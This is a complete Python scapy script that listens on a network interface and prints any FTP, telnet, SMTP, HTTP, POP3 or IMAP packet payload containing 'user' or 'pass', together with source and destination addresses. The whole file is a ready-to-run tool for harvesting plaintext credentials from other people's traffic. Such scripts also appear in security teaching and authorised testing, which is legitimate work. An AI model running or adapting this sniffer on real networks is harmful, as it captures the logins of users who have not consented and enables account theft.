#!/usr/bin/python

from scapy.all import Raw, sniff, TCP, IP
import argparse

protocols = {
    	'ftp': 21,
    	'telnet': 23,
    	'smtp': 25,
    	'http': 80,
    	'pop3': 110,
    	'imap': 143,
    	}

# Search for username or password in network traffic
def packet_callback(packet):
	if packet.haslayer(TCP) and packet.haslayer(Raw):
		data = packet[Raw].load
		data = data.decode('utf-8').rstrip('\r\n')
		
        # Print credentials if found
		if 'user' in data.lower() or 'pass' in data.lower():
			print("Src:", str(packet[IP].src))
			print("Dst:", str(packet[IP].dst))
			print("Port:", str(packet[TCP].dport))
			print("[*]", str(data), "\n")

def main():
	# Parse arguments from user; can provide port(s) or protocol(s) to sniff
	parser = argparse.ArgumentParser(description="Sniff plaintext credentials on specified insecure ports/protocols")
	parser.add_argument('-i', '--interface', required=True, help="Network interface")
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('-p', '--port', nargs="+", type=int, choices=protocols.values(),
                	help="Specify port(s) to sniff: 21, 23, 25, 80, 110, 143")
	group.add_argument('-P', '--protocol', nargs="+", type=str, choices=protocols.keys(),
                	help="Specify protocol to sniff: ftp, telnet, smtp, http, pop3, imap")
	args = parser.parse_args()

	# Translate given protocols into port numbers, if needed
	if args.protocol:
		ports = [protocols[p] for p in args.protocol]
	else:
		ports = args.port

	# Start sniffing traffic
	sniff(filter='tcp port {}'.format(' or tcp port '.join(map(str, ports))), prn=packet_callback, iface=args.interface, store=0)


if __name__ == '__main__':
    	main()
